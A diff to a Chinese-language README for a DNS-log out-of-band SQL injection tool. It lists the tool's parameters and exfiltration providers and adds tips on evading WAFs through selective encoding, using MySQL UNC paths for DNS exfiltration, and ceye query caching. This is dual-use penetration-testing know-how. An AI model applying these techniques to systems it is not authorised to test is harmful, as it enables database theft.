@@ -45,11 +45,12 @@ python3 dnslogsqlinj3.py --provider ceye --token TOKEN --ident IDENT --dbms mysq
 - **平台**：`dnslog.cn` / `ceye`（`--token --ident`）/ `dnsloggo`（`--base --token`）/ `cmd`（自定义命令）
 - **参数**：`--prefix`（默认 `AND `）、`--encode auto|strict`、`--chunk`、`--http-timeout`、`--sleep-delay`、`--samples`
 
-## 三个坑（已内置）
+## 踩过的坑（已内置）
 
 1. 全量 URL 编码把 `/ " ( )` 变成 `%2F %22 %28`，会被部分 WAF 断连 → 默认只编码空格与 `& # % +`。
 2. MySQL 在某些 Windows 上只对 `//host/share/x.txt` 发起解析，反斜杠 UNC 直接返回 NULL。
 3. `%PAYLOAD%` 只替换表达式，缺 `AND` 会拼出语法错 → `--prefix` 默认 `AND `。
+4. ceye 对带 `filter` 的记录查询有缓存，首次查空后几十秒都返回空 → 默认不加 filter，拉最近记录本地匹配。
 
 ## 测试
 
